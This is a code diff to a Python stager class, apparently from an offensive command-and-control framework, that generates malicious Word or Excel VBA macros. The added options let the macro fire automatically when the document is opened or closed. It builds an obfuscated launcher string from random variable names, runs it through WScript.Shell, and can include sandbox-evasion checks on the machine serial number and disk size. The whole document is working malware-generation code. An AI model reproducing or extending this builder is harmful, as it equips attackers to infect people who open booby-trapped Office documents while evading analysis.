@@ -105,6 +105,20 @@ class Stager:
                 "SuggestedValues": ["True", "False"],
                 "Strict": True,
             },
+            "Trigger": {
+                "Description": "Trigger for the macro (autoopen, autoclose).",
+                "Required": True,
+                "Value": "autoopen",
+                "SuggestedValues": ["autoopen", "autoclose"],
+                "Strict": True,
+            },
+            "DocType": {
+                "Description": "Type of document to generate (word, excel).",
+                "Required": True,
+                "Value": "word",
+                "SuggestedValues": ["word", "excel"],
+                "Strict": True,
+            },
         }
 
         self.mainMenu = mainMenu
@@ -123,6 +137,19 @@ class Stager:
         safe_checks = self.options["SafeChecks"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
         outlook_evasion = self.options["OutlookEvasion"]["Value"]
+        trigger = self.options["Trigger"]["Value"]
+        doc_type = self.options["DocType"]["Value"]
+
+        if doc_type.lower() == "excel":
+            if trigger.lower() == "autoopen":
+                macro_sub_name = "Workbook_Open()"
+            else:
+                macro_sub_name = "Workbook_BeforeClose(Cancel As Boolean)"
+        else:
+            if trigger.lower() == "autoopen":
+                macro_sub_name = "AutoOpen()"
+            else:
+                macro_sub_name = "AutoClose()"
 
         encode = False
         if base64.lower() == "true":
@@ -170,6 +197,10 @@ class Stager:
                 bypasses=bypasses,
             )
 
+        if launcher == "":
+            log.error("[!] Error in launcher command generation.")
+            return ""
+
         set_string = "".join(
             random.choice(string.ascii_letters)
             for i in range(random.randint(1, len(listener_name)))
@@ -179,40 +210,38 @@ class Stager:
             for i in range(random.randint(1, len(listener_name)))
         )
 
-        if launcher == "":
-            log.error("[!] Error in launcher command generation.")
-            return ""
-        else:
-            chunks = list(helpers.chunks(launcher, 50))
-            payload = "\tDim " + set_string + " As String\n"
-            payload += "\t" + set_string + ' = "' + str(chunks[0]) + '"\n'
-            for chunk in chunks[1:]:
-                payload += (
-                    "\t" + set_string + " = " + set_string + ' + "' + str(chunk) + '"\n'
-                )
+        chunks = list(helpers.chunks(launcher, 50))
+        payload = "\tDim " + set_string + " As String\n"
+        payload += "\t" + set_string + ' = "' + str(chunks[0]) + '"\n'
+        for chunk in chunks[1:]:
+            payload += (
+                "\t" + set_string + " = " + set_string + ' + "' + str(chunk) + '"\n'
+            )
 
-            macro = "Sub AutoClose()\n"
-            macro += "\t" + set_method + "\n"
-            macro += "End Sub\n\n"
+        macro = f"Sub {macro_sub_name}\n"
+        macro += "\t" + set_method + "\n"
+        macro += "End Sub\n\n"
 
-            macro += "Public Function " + set_method + "() As Variant\n"
+        macro += "Public Function " + set_method + "() As Variant\n"
 
-            if outlook_evasion_bool is True:
-                macro += '\tstrComputer = "."\n'
-                macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\cimv2")\n'
-                macro += '\tSet ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")\n'
-                macro += "\tFor Each objItem In ID\n"
-                macro += '\t\tIf StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End\n'
-                macro += "\tNext\n"
-                macro += '\tSet disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")\n'
-                macro += "\tFor Each objItem In disksize\n"
-                macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
-                macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
-                macro += "\tNext\n"
+        if outlook_evasion_bool is True:
+            macro += '\tstrComputer = "."\n'
+            macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\cimv2")\n'
+            macro += '\tSet ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")\n'
+            macro += "\tFor Each objItem In ID\n"
+            macro += (
+                '\t\tIf StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End\n'
+            )
+            macro += "\tNext\n"
+            macro += '\tSet disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")\n'
+            macro += "\tFor Each objItem In disksize\n"
+            macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
+            macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
+            macro += "\tNext\n"
 
-            macro += payload
-            macro += '\tSet asd = CreateObject("WScript.Shell")\n'
-            macro += "\tasd.Run(" + set_string + ")\n"
-            macro += "End Function\n"
+        macro += payload
+        macro += '\tSet asd = CreateObject("WScript.Shell")\n'
+        macro += "\tasd.Run(" + set_string + ")\n"
+        macro += "End Function\n"
 
-            return macro
+        return macro
